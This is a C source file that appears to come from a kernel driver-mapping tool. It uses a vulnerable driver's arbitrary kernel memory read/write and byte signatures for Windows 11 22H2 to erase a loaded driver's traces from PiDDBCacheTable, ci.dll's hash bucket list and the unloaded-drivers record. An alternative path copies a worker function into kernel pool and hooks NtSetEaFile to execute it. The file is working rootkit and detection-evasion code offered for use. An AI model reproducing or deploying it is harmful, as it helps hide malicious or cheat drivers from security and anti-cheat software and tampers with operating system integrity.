#include "main.h"

#define WINDOWS_11_22H2
#if defined(WINDOWS_11_22H2)
//SigMakerEx: Finding signature for 0000000086A1A2.
//Address SIG: 0x0000000086A1A2, 22 bytes 12, wildcards.
//IDA: "48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B C3 48 83 C4"
//"\x48\x8D\x0D\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC\x8B\xC3\x48\x83\xC4", "xxx????x????x????xxxxx"

static UCHAR PiDDBLockPattern[]
    = "\x48\x8D\x0D\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC\xE8\xCC\xCC\xCC\xCC\x8B\xC3\x48\x83\xC4";
static CHAR PiDDBLockMask[] = "xxx????x????x????xxxxx";

//SigMakerEx: Finding signature for 0000000074DFB2.
//Address SIG: 0x0000000074DFB2, 14 bytes 4, wildcards.
//IDA: "48 8D 0D ?? ?? ?? ?? 45 33 F6 48 89 44 24"
//"\x48\x8D\x0D\xCC\xCC\xCC\xCC\x45\x33\xF6\x48\x89\x44\x24", "xxx????xxxxxxx"

static UCHAR PiDDBCacheTablePattern[] = "\x48\x8D\x0D\xCC\xCC\xCC\xCC\x45\x33\xF6\x48\x89\x44\x24";
static CHAR PiDDBCacheTableMask[]     = "xxx????xxxxxxx";
static UCHAR HashBucketListPattern[]
    = "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00";
static CHAR HashBucketListMask[]    = "xxx????x?xxxxxxx";
static UCHAR HashCacheLockPattern[] = "\x48\x8D\x0D";
static CHAR HashCacheLockMask[]     = "xxx";
#endif

#if 1
//
// Main code.
//

BOOLEAN MmUnloadedDriver(_In_ PDEVICE_DRIVER_OBJECT Driver)
{
    ULONGLONG ProcessAddr;
    ULONGLONG DeviceObject;
    ULONGLONG DriverObject;
    ULONGLONG DriverSection;
    UNICODE_STRING BaseDllName;
    WCHAR DriverName[MAX_PATH];
    NTSTATUS Status;

    Status = ObGetObjectByHandle(Driver->DeviceHandle, &ProcessAddr);

    if NT_SUCCESS (Status) {
        RtlSecureZeroMemory(DriverName, sizeof(DriverName));
        if NT_ERROR (
            Driver->ReadMemory(
                Driver->DeviceHandle,
                ProcessAddr + 0x8,
                &DeviceObject,
                sizeof(DeviceObject))
            || !DeviceObject) {
            DEBUG_PRINT("[!] Failed to find DeviceObject");
            return FALSE;
        }

        if NT_ERROR (
            Driver->ReadMemory(
                Driver->DeviceHandle,
                DeviceObject + offsetof(DEVICE_OBJECT, DriverObject),
                &DriverObject,
                sizeof(DriverObject))
            || !DriverObject) {
            DEBUG_PRINT("[!] Failed to find DriverObject");
            return FALSE;
        }

        if NT_ERROR (
            Driver->ReadMemory(
                Driver->DeviceHandle,
                DriverObject + offsetof(DRIVER_OBJECT, DriverSection),
                &DriverSection,
                sizeof(DriverSection))
            || !DriverSection) {
            DEBUG_PRINT("[!] Failed to find DriverSection");
            return FALSE;
        }

        if NT_ERROR (
            Driver->ReadMemory(
                Driver->DeviceHandle,
                DriverSection + offsetof(LDR_DATA_TABLE_ENTRY, BaseDllName),
                &BaseDllName,
                sizeof(BaseDllName))
            || BaseDllName.Length == 0) {
            DEBUG_PRINT("[!] Failed to find DriverName");
            return FALSE;
        }

        if NT_ERROR (Driver->ReadMemory(
                         Driver->DeviceHandle,
                         (ULONGLONG)BaseDllName.Buffer,
                         DriverName,
                         BaseDllName.Length)) {
            DEBUG_PRINT("[!] Failed to read DriverName");
            return FALSE;
        }

        DEBUG_PRINT("[+] Found %ws on Ldr Table Entry.", DriverName);
        // MiRememberUnloadedDriver will check
        // if the length > 0 to save the unloaded
        // driver
        BaseDllName.Length = 0;
        if NT_ERROR (Driver->WriteMemory(
                         Driver->DeviceHandle,
                         DriverSection + offsetof(LDR_DATA_TABLE_ENTRY, BaseDllName),
                         &BaseDllName,
                         sizeof(BaseDllName))) {
            DEBUG_PRINT("[!] Failed to write driver name length");
            return FALSE;
        }

        return TRUE;
    }

    return FALSE;
}

BOOLEAN PidDBCacheTable(
    _In_ PDEVICE_DRIVER_OBJECT Driver,
    _In_ LPWSTR DriverFilename,
    _In_ ULONG TimeDateStamp)
{
    PVOID PiDDBLock;
    PRTL_AVL_TABLE PiDDBCacheTable;
    RTL_PROCESS_MODULE_INFORMATION KernelModule;
    PDDBCACHE_ENTRY pFoundEntry;
    DDBCACHE_ENTRY LocalEntry;
    CHAR v1[] = {'n', 't', 'o', 's', 'k', 'r', 'n', 'l', '.', 'e', 'x', 'e', '\0'};

    RtlZeroMemory(&KernelModule, sizeof(KernelModule));
    MmGetSystemModuleA(v1, &KernelModule);

    PiDDBLock = KiFindPattern(
        Driver,
        KernelModule.ImageBase,
        KernelModule.ImageSize,
        PiDDBLockPattern,
        PiDDBLockMask);

    PiDDBCacheTable = KiFindPattern(
        Driver,
        KernelModule.ImageBase,
        KernelModule.ImageSize,
        PiDDBCacheTablePattern,
        PiDDBCacheTableMask);

    if (PiDDBLock && PiDDBCacheTable) {
        PiDDBLock       = KiRelativeVirtualAddress(Driver, PiDDBLock, 3, 7);
        PiDDBCacheTable = KiRelativeVirtualAddress(Driver, PiDDBCacheTable, 3, 7);
    }

    if (PiDDBLock == 0 || PiDDBCacheTable == 0) {
        DEBUG_PRINT("[-] PiDDBLock: 0x%p.", PiDDBLock);
        DEBUG_PRINT("[-] PiDDBCacheTable: 0x%p.", PiDDBCacheTable);

        return FALSE;
    }

    //
    // context part is not used by lookup, lock or delete why we should use it?
    //

    if NT_ERROR (KiExAcquireResourceExclusiveLite(Driver, PiDDBLock, TRUE)) {
        DEBUG_PRINT("[-] Can't lock PiDDBCacheTable");
        return FALSE;
    }

    //
    // search our entry in the table
    //
    LocalEntry.TimeDateStamp = TimeDateStamp;
    RtlInitUnicodeString(&LocalEntry.Name, DriverFilename);
    if (NT_ERROR(
            KiRtlLookupElementGenericTableAvl(Driver, PiDDBCacheTable, &LocalEntry, &pFoundEntry))
        || pFoundEntry == NULL) {
        DEBUG_PRINT("[-] Not found in cache");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    // first, unlink from the list
    PLIST_ENTRY PreviousList = NULL;
    if NT_ERROR (Driver->ReadMemory(
                     Driver->DeviceHandle,
                     (ULONGLONG)pFoundEntry + FIELD_OFFSET(DDBCACHE_ENTRY, List.Blink),
                     &PreviousList,
                     sizeof(PLIST_ENTRY))) {
        DEBUG_PRINT("[-] Can't get prev entry");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    PLIST_ENTRY next = NULL;
    if NT_ERROR (Driver->ReadMemory(
                     Driver->DeviceHandle,
                     (ULONGLONG)pFoundEntry + FIELD_OFFSET(DDBCACHE_ENTRY, List.Flink),
                     &next,
                     sizeof(PLIST_ENTRY))) {
        DEBUG_PRINT("[-] Can't get next entry");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    if NT_ERROR (Driver->WriteMemory(
                     Driver->DeviceHandle,
                     (ULONGLONG)PreviousList + FIELD_OFFSET(struct _LIST_ENTRY, Flink),
                     &next,
                     sizeof(PLIST_ENTRY))) {
        DEBUG_PRINT("[-] Can't set next entry");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    if NT_ERROR (Driver->WriteMemory(
                     Driver->DeviceHandle,
                     (ULONGLONG)next + FIELD_OFFSET(struct _LIST_ENTRY, Blink),
                     &PreviousList,
                     sizeof(PLIST_ENTRY))) {
        DEBUG_PRINT("[-] Can't set prev entry");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    // then delete the element from the avl table
    if NT_ERROR (KiRtlDeleteElementGenericTableAvl(Driver, PiDDBCacheTable, pFoundEntry)) {
        DEBUG_PRINT("[-] Can't delete from PiDDBCacheTable");
        KiExReleaseResourceLite(Driver, PiDDBLock);
        return FALSE;
    }

    //
    // Decrement delete count
    //

    ULONG cacheDeleteCount = 0;

    Driver->ReadMemory(
        Driver->DeviceHandle,
        (ULONGLONG)PiDDBCacheTable + (FIELD_OFFSET(struct _RTL_AVL_TABLE, DeleteCount)),
        &cacheDeleteCount,
        sizeof(ULONG));

    if (cacheDeleteCount > 0) {
        cacheDeleteCount--;
        if NT_ERROR (Driver->WriteMemory(
                         Driver->DeviceHandle,
                         (ULONGLONG)PiDDBCacheTable
                             + (FIELD_OFFSET(struct _RTL_AVL_TABLE, DeleteCount)),
                         &cacheDeleteCount,
                         sizeof(ULONG))) {
            DEBUG_PRINT("[-] Failed WriteSystemMemory to cacheDeleteCount.");
        }
    }

    //
    // release the ddb resource lock
    //

    KiExReleaseResourceLite(Driver, PiDDBLock);
    DEBUG_PRINT("[+] PidDb Cleaned.");
    return TRUE;
}

BOOLEAN KernelHashBucketList(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ LPWSTR DriverFilename)
{
    RTL_PROCESS_MODULE_INFORMATION ModuleInformation;
    CHAR v1[] = {'c', 'i', '.', 'd', 'l', 'l', '\0'};


    if NT_ERROR (MmGetSystemModuleA(v1, &ModuleInformation))
        return FALSE;

    // Thanks @KDIo3 and @Swiftik from UnknownCheats
    PVOID HashBucketList = KiFindPattern(
        Driver,
        ModuleInformation.ImageBase,
        ModuleInformation.ImageSize,
        HashBucketListPattern,
        HashBucketListMask);

    PVOID HashBucketLock = KiFindPattern(
        Driver,
        (PCHAR)HashBucketList - 50,
        50,
        HashCacheLockPattern,
        HashCacheLockMask);

    if (HashBucketList && HashBucketLock) {
        HashBucketList = KiRelativeVirtualAddress(Driver, HashBucketList, 3, 7);
        HashBucketLock = KiRelativeVirtualAddress(Driver, HashBucketLock, 3, 7);
    }

    if (!HashBucketList || !HashBucketLock) {
        DEBUG_PRINT("[-] HashBucketList: 0x%p.", HashBucketList);
        DEBUG_PRINT("[-] HashBucketLock: 0x%p.", HashBucketLock);
        return FALSE;
    }

    if NT_SUCCESS (KiExAcquireResourceExclusiveLite(Driver, HashBucketLock, TRUE)) {
        PHASH_BUCKET_ENTRY HashBucketPrev  = HashBucketList;
        PHASH_BUCKET_ENTRY HashBucketEntry = NULL;

        if NT_ERROR (Driver->ReadMemory(
                         Driver->DeviceHandle,
                         (ULONGLONG)HashBucketPrev,
                         &HashBucketEntry,
                         sizeof(HashBucketEntry))) {
            DEBUG_PRINT("[-] Failed to read first HashBucketEntry: 0x%p.", HashBucketEntry);
            KiExReleaseResourceLite(Driver, HashBucketLock);
            return FALSE;
        }

        if (!HashBucketEntry) {
            DEBUG_PRINT("[!] g_KernelHashBucketList looks empty!");
            KiExReleaseResourceLite(Driver, HashBucketLock);
            return TRUE;
        }

        while (HashBucketEntry != HashBucketPrev) {
            PHASH_BUCKET_ENTRY HashBucketNext = 0;
            HASH_BUCKET_ENTRY HashBucket;
            LPWSTR lpDriverName;

            if NT_ERROR (Driver->ReadMemory(
                             Driver->DeviceHandle,
                             (ULONGLONG)HashBucketEntry,
                             &HashBucket,
                             sizeof(HashBucket))) {
                DEBUG_PRINT("[-] Failed reading HashBucketEntry.");
                break;
            }

            lpDriverName = RtlAllocateMemory(HashBucket.DriverName.MaximumLength);
            if NT_ERROR (Driver->ReadMemory(
                             Driver->DeviceHandle,
                             (ULONGLONG)HashBucket.DriverName.Buffer,
                             lpDriverName,
                             HashBucket.DriverName.Length)) {
                DEBUG_PRINT("[-] Failed reading HashBucketEntry DriverName.");
                RtlFreeMemory(lpDriverName);
                break;
            }

            if (wcsstr(lpDriverName, DriverFilename)) {
                if NT_ERROR (Driver->ReadMemory(
                                 Driver->DeviceHandle,
                                 (ULONGLONG)HashBucketEntry,
                                 &HashBucketNext,
                                 sizeof(HashBucketNext))) {
                    DEBUG_PRINT("[-] Failed reading HashBucketEntry Next Entry.");
                    RtlFreeMemory(lpDriverName);
                    break;
                }

                if NT_ERROR (Driver->WriteMemory(
                                 Driver->DeviceHandle,
                                 (ULONGLONG)HashBucketPrev,
                                 &HashBucketNext,
                                 sizeof(HashBucketNext))) {
                    DEBUG_PRINT("[-] Failed unlinking HashBucketEntry.");
                    RtlFreeMemory(lpDriverName);
                    break;
                }

                DEBUG_PRINT("[+] HashBucketEntry of %ws has been Cleaned.", lpDriverName);
                KiExFreePool(Driver, (ULONGLONG)HashBucketEntry);
                KiExReleaseResourceLite(Driver, HashBucketLock);
                RtlFreeMemory(lpDriverName);
                return TRUE;
            }

            RtlFreeMemory(lpDriverName);

            // Read Next
            HashBucketPrev = HashBucketEntry;
            if NT_ERROR (Driver->ReadMemory(
                             Driver->DeviceHandle,
                             (ULONGLONG)HashBucketEntry,
                             &HashBucketEntry,
                             sizeof(HashBucketEntry))) {
                DEBUG_PRINT(
                    "[-] Failed to read HashBucketEntry next entry: 0x%p.",
                    HashBucketEntry);
                break;
            }
        }

        KiExReleaseResourceLite(Driver, HashBucketLock);
    }

    return FALSE;
}

//
// Public api
//

NTSTATUS RemoveDriverRuntimeList(IN PDEVICE_DRIVER_OBJECT Driver, IN LPCWSTR DriverName)
{
    NTSTATUS Status;
    RTL_PROCESS_MODULE_INFORMATION Module;
    extern ULONGLONG DriverResource[5517];

    Status = MmGetSystemModuleW(DriverName, &Module);
    if NT_SUCCESS (Status) {
        Status = STATUS_ACCESS_DENIED;
        if (PidDBCacheTable(
                Driver,
                (LPWSTR)DriverName,
                RtlImageNtHeader(DriverResource)->FileHeader.TimeDateStamp)) {
            if (KernelHashBucketList(Driver, (LPWSTR)DriverName)) {
                if (MmUnloadedDriver(Driver))
                    Status = STATUS_SUCCESS;
            }
        }
    }

    return Status;
}

#else
typedef struct _DRIVER_RUNTIME_WORKER_CONTEXT
{
    struct
    {
        UNICODE_STRING DriverName;
    };

    struct
    {
        PERESOURCE PiDDBLock;
        PRTL_AVL_TABLE PiDDBCacheTable;
        PERESOURCE HashBucketLock;
        PHASH_BUCKET_ENTRY HashBucketList;
    };

    KERNEL_IMPORT_TABLE Table;
} DRIVER_RUNTIME_WORKER_CONTEXT, *PDRIVER_RUNTIME_WORKER_CONTEXT;

FORCEINLINE PKLDR_DATA_TABLE_ENTRY KERNEL_MODE_API
LookupDataTableEntry(IN PKERNEL_IMPORT_TABLE Table, IN PUNICODE_STRING DriverName)
{
    PLIST_ENTRY Entry;
    PKLDR_DATA_TABLE_ENTRY CurrentTable;
    PKLDR_DATA_TABLE_ENTRY Result;
    PKLDR_DATA_TABLE_ENTRY KernelTable;

    Result = NULL;
    KernelTable
        = CONTAINING_RECORD(Table->PsLoadedModuleList, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    for (Entry = KernelTable->InLoadOrderLinks.Flink; Entry != &KernelTable->InLoadOrderLinks;
         Entry = Entry->Flink) {
        CurrentTable = CONTAINING_RECORD(Entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (Table->RtlEqualUnicodeString(&CurrentTable->BaseDllName, DriverName, TRUE)) {
            Result = CurrentTable;
            break;
        }
    }
    return Result;
}

static NTSTATUS KERNEL_MODE_API
RemoveDriverRuntimeListWorker(IN PDRIVER_RUNTIME_WORKER_CONTEXT Context)
{
    PKLDR_DATA_TABLE_ENTRY DriverTable;
    NTSTATUS Status;
    DDBCACHE_ENTRY LocalEntry;
    PDDBCACHE_ENTRY CacheEntry;

    PKERNEL_IMPORT_TABLE Import;

    Import      = &Context->Table;
    DriverTable = LookupDataTableEntry(Import, &Context->DriverName);
    if (DriverTable == NULL) {
        Status = STATUS_INVALID_PARAMETER;
        return Status;
    }

    // DDB_CACHE_ENTRY
    Status = STATUS_RESOURCE_NOT_OWNED;
    if (Import->ExAcquireResourceExclusiveLite(Context->PiDDBLock, TRUE)) {
        LocalEntry.TimeDateStamp      = DriverTable->TimeDateStamp;
        LocalEntry.Name.Buffer        = DriverTable->BaseDllName.Buffer;
        LocalEntry.Name.Length        = DriverTable->BaseDllName.Length;
        LocalEntry.Name.MaximumLength = DriverTable->BaseDllName.MaximumLength;
        CacheEntry = Import->RtlLookupElementGenericTableAvl(Context->PiDDBCacheTable, &LocalEntry);
        Status     = STATUS_NOT_FOUND;

        if (CacheEntry) {
            PLIST_ENTRY NextEntry, PrevEntry;
            NextEntry        = CacheEntry->List.Flink;
            PrevEntry        = CacheEntry->List.Blink;
            PrevEntry->Flink = NextEntry;
            NextEntry->Blink = PrevEntry;

            if (Import->RtlDeleteElementGenericTableAvl(Context->PiDDBCacheTable, CacheEntry)) {
                if (Context->PiDDBCacheTable->DeleteCount > 0) {
                    Context->PiDDBCacheTable->DeleteCount--;
                    Status = STATUS_SUCCESS;
                }
            }
        }
        Import->ExReleaseResourceLite(Context->PiDDBLock);
    }

    // HASH_BUCKET_LIST
    if NT_SUCCESS (Status) {
        PHASH_BUCKET_ENTRY HashPrevEntry;
        USHORT DriverNameVA;
        LPWSTR DriverNameBuffer;
        UNICODE_STRING BaseDriverName;

        Status = STATUS_RESOURCE_NOT_OWNED;
        if (Import->ExAcquireResourceExclusiveLite(Context->HashBucketLock, TRUE)) {
            HashPrevEntry = Context->HashBucketList;

            Status = STATUS_MEMORY_NOT_ALLOCATED;
            while (Context->HashBucketList->Next != NULL) {
                if (Context->HashBucketList->DriverName.Buffer) {
                    DriverNameVA = Context->HashBucketList->DriverName.Length
                                   - DriverTable->BaseDllName.Length;
                    DriverNameVA     /= sizeof(WCHAR);
                    DriverNameBuffer  = Context->HashBucketList->DriverName.Buffer + DriverNameVA;
                    Import->RtlInitUnicodeString(&BaseDriverName, DriverNameBuffer);

                    Status = STATUS_NOT_MAPPED_DATA;
                    if (Import->RtlEqualUnicodeString(
                            &BaseDriverName,
                            &DriverTable->BaseDllName,
                            TRUE)
                        == TRUE) {
                        HashPrevEntry->Next = Context->HashBucketList->Next;

                        Import->memset(
                            Context->HashBucketList->CertHash,
                            0,
                            sizeof(Context->HashBucketList->CertHash));

                        Import->memset(
                            Context->HashBucketList->DriverName.Buffer,
                            0,
                            Context->HashBucketList->DriverName.Length);

                        Import->memset(
                            &Context->HashBucketList->DriverName,
                            0,
                            sizeof(Context->HashBucketList->DriverName));

                        Import->ExFreePoolWithTag(Context->HashBucketList, 0);
                        Context->HashBucketList = NULL;

                        Status = STATUS_SUCCESS;
                        break;
                    }
                }

                HashPrevEntry           = Context->HashBucketList;
                Context->HashBucketList = Context->HashBucketList->Next;
            }

            Import->ExReleaseResourceLite(Context->HashBucketLock);
        }
    }

    DriverTable->BaseDllName.Length = 0;
    return Status;
}

NTSTATUS RemoveDriverRuntimeList(IN PDEVICE_DRIVER_OBJECT Driver, IN LPCWSTR DriverName)
{
    NTSTATUS Status;
    RTL_PROCESS_MODULE_INFORMATION SystemModule;
    RTL_PROCESS_MODULE_INFORMATION CiModule;
    PVOID PiDDBLock;
    PRTL_AVL_TABLE PiDDBCacheTable;
    ULONGLONG WorkerRoutine;
    DRIVER_RUNTIME_WORKER_CONTEXT WorkerContext;
    UCHAR Storage[12];
    SIZE_T WorkerSize;

    CHAR v1[] = {'n', 't', 'o', 's', 'k', 'r', 'n', 'l', '.', 'e', 'x', 'e', '\0'};
    CHAR v2[] = {'c', 'i', '.', 'd', 'l', 'l', '\0'};

    // Query Module Information.
    RtlSecureZeroMemory(&WorkerContext, sizeof(WorkerContext));
    RtlSecureZeroMemory(&SystemModule, sizeof(SystemModule));
    RtlSecureZeroMemory(&CiModule, sizeof(CiModule));
    Status = MmGetSystemModuleA(v1, &SystemModule);

    if NT_SUCCESS (Status)
        Status = MmGetSystemModuleA(v2, &CiModule);

    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    // Find all needed pattern.
    PiDDBLock = KiFindPattern(
        Driver,
        SystemModule.ImageBase,
        SystemModule.ImageSize,
        PiDDBLockPattern,
        PiDDBLockMask);

    PiDDBCacheTable = KiFindPattern(
        Driver,
        SystemModule.ImageBase,
        SystemModule.ImageSize,
        PiDDBCacheTablePattern,
        PiDDBCacheTableMask);

    // Thanks @KDIo3 and @Swiftik from UnknownCheats
    PVOID HashBucketList = KiFindPattern(
        Driver,
        CiModule.ImageBase,
        CiModule.ImageSize,
        HashBucketListPattern,
        HashBucketListMask);

    PVOID HashBucketLock = KiFindPattern(
        Driver,
        (PCHAR)HashBucketList - 50,
        50,
        HashCacheLockPattern,
        HashCacheLockMask);

    if (PiDDBLock && PiDDBCacheTable && HashBucketList && HashBucketLock) {
        PiDDBLock       = KiRelativeVirtualAddress(Driver, PiDDBLock, 3, 7);
        PiDDBCacheTable = KiRelativeVirtualAddress(Driver, PiDDBCacheTable, 3, 7);
        HashBucketList  = KiRelativeVirtualAddress(Driver, HashBucketList, 3, 7);
        HashBucketLock  = KiRelativeVirtualAddress(Driver, HashBucketLock, 3, 7);
    }

    if (PiDDBLock == 0 || PiDDBCacheTable == 0 || HashBucketList == 0 || HashBucketLock == 0) {
        Status = STATUS_INVALID_SIGNATURE;
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    // Create Context.
    RtlInitUnicodeString(&WorkerContext.DriverName, DriverName);
    WorkerContext.PiDDBLock       = PiDDBLock;
    WorkerContext.PiDDBCacheTable = PiDDBCacheTable;
    WorkerContext.HashBucketList  = HashBucketList;
    WorkerContext.HashBucketLock  = HashBucketLock;

    Status = MiResolveImportTable(&WorkerContext.Table);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTSTATUS(Status);
        return Status;
    }

    WorkerSize = GetProcedureSize((PVOID)RemoveDriverRuntimeListWorker);
    Status     = KiExAllocatePool2(Driver, WorkerSize, &WorkerRoutine);

    if NT_SUCCESS (Status) {
        Status = Driver->WriteMemory(
            Driver->DeviceHandle,
            WorkerRoutine,
            (PVOID)RemoveDriverRuntimeListWorker,
            WorkerSize);

        if NT_SUCCESS (Status) {
            Status = HookSystemRoutine(Driver, WorkerRoutine, Storage);
            if NT_SUCCESS (Status) {
                typedef NTSTATUS (*WorkerRoutine_t)(IN PVOID Context);
                WorkerRoutine_t Worker = (WorkerRoutine_t)NtSetEaFile;

                Status = Worker(&WorkerContext);
                DEBUG_PRINT_NTSTATUS(Status);

                UnhookSystemRoutine(Driver, Storage);
            }
        }

        KiExFreePool(Driver, WorkerRoutine);
    }

    return Status;
}
#endif
